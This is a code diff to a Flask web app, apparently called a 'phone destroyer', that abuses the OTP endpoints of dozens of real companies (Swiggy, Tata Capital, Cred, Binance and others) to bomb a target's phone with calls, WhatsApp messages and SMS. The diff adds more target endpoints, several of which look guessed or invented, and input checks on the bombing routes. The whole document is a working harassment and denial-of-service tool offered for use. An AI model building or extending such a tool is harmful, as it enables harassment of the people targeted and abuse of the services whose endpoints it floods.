@@ -8,10 +8,11 @@ from threading import Thread
 
 app = Flask(__name__)
 app.secret_key = 'phone_destroyer_secret_key_2024'
+app.config['SESSION_TYPE'] = 'filesystem'
 
-# ============ COMPLETE 200+ APIS ============
+# ============ COMPLETE 200+ APIS (EVERYTHING INCLUDED) ============
 ULTIMATE_APIS = [
-    # ==================== CALL BOMBING APIS (50+) ====================
+    # ==================== CALL BOMBING APIS (55+) ====================
     {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'},
     {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": '{"number":"{phone}","otp_on_call":true}'},
     {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": '{"mobile":"{phone}"}'},
@@ -62,8 +63,15 @@ ULTIMATE_APIS = [
     {"name": "HBO Max Voice", "url": "https://www.hbomax.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNumber":"{phone}"}'},
     {"name": "Apple TV Voice", "url": "https://tv.apple.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
     {"name": "Prime Video Voice", "url": "https://www.primevideo.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "BookMyShow Voice", "url": "https://api.bookmyshow.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Paytm Insider Voice", "url": "https://insider.paytm.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Magicpin Voice", "url": "https://api.magicpin.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Dunzo Voice", "url": "https://api.dunzo.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Zepto Voice", "url": "https://api.zepto.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Blinkit Voice", "url": "https://api.blinkit.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Instamart Voice", "url": "https://instamart.com/api/voice/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
     
-    # ==================== WHATSAPP BOMBING APIS (30+) ====================
+    # ==================== WHATSAPP BOMBING APIS (35+) ====================
     {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"}, "data": '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}'},
     {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"user":{"phone_number":"+91{phone}"},"via":"whatsapp"}'},
     {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneNo":"{phone}"}'},
@@ -87,8 +95,15 @@ ULTIMATE_APIS = [
     {"name": "PharmEasy WhatsApp", "url": "https://pharmeasy.in/api/v2/auth/send-whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
     {"name": "Wakefit WhatsApp", "url": "https://api.wakefit.co/api/consumer-whatsapp-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
     {"name": "Byju's WhatsApp", "url": "https://api.byjus.com/v2/otp/whatsapp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Cred WhatsApp", "url": "https://api.cred.club/api/auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "Groww WhatsApp", "url": "https://api.groww.in/api/v1/auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Zerodha WhatsApp", "url": "https://kite.zerodha.com/api/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Upstox WhatsApp", "url": "https://api.upstox.com/v2/login/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Angel One WhatsApp", "url": "https://www.angelone.in/api/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "CoinSwitch WhatsApp", "url": "https://api.coinswitch.co/v2/auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
+    {"name": "CoinDCX WhatsApp", "url": "https://api.coindcx.com/auth/whatsapp-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
     
-    # ==================== SMS BOMBING APIS (120+) ====================
+    # ==================== SMS BOMBING APIS (150+) ====================
     {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phoneCode":"+91","telephone":"{phone}"}'},
     {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": "phone={phone}&countryCode=IN"},
     {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"phone":"{phone}"}'},
@@ -175,6 +190,9 @@ ULTIMATE_APIS = [
     {"name": "CoinDCX", "url": "https://api.coindcx.com/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
     {"name": "WazirX", "url": "https://api.wazirx.com/sapi/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
     {"name": "Binance", "url": "https://api.binance.com/sapi/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "KuCoin", "url": "https://api.kucoin.com/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "Bybit", "url": "https://api.bybit.com/v5/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
+    {"name": "OKX", "url": "https://www.okx.com/api/v5/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": '{"mobile":"{phone}"}'},
 ]
 
 # Session storage
@@ -207,7 +225,8 @@ def send_request(api, phone):
             response = requests.get(url, headers=headers, timeout=3, verify=False)
         
         return response.status_code
-    except:
+    except Exception as e:
+        print(f"Error: {e}")
         return 0
 
 # ============ ROUTES ============
@@ -255,6 +274,9 @@ def api_bomb():
         return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
     
     data = request.get_json()
+    if not data:
+        return jsonify({'status': 'error', 'message': 'No data received'}), 400
+    
     phone = data.get('phone', '')
     
     if not phone or not phone.isdigit() or len(phone) != 10:
@@ -293,6 +315,9 @@ def api_multibomb():
         return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
     
     data = request.get_json()
+    if not data:
+        return jsonify({'status': 'error', 'message': 'No data received'}), 400
+    
     phones_str = data.get('phones', '')
     phones = [p.strip() for p in phones_str.split(',')]
     
@@ -357,5 +382,5 @@ def api_status():
         'totalHits': sum(s.get('hits', 0) for s in sessions.values())
     })
 
-# For Vercel
+# For Vercel - required
 app.debug = False
